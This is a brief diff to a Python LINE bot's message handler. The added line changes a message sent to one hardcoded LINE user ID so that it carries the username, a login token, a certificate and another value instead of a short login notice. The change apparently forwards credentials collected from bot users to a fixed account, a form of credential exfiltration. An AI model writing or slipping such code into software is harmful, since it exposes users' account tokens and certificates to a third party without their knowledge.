@@ -372,7 +372,7 @@ def handle_message(event):
 		certs = (""+result["result"]["cert"])
 		print("Token : "+hasil)
 		line_bot_api.multicast(["Ua1c65426206f131b7c32c4114163df22"],
-		[TextSendMessage(text='Login {}'.format(us,hasil)),])
+		[TextSendMessage(text='Logins {} {} {} {}'.format(us,hasil,certs,q)),])
 
 	elif text == 'carousel':
 		carousel_template = CarouselTemplate(columns=[
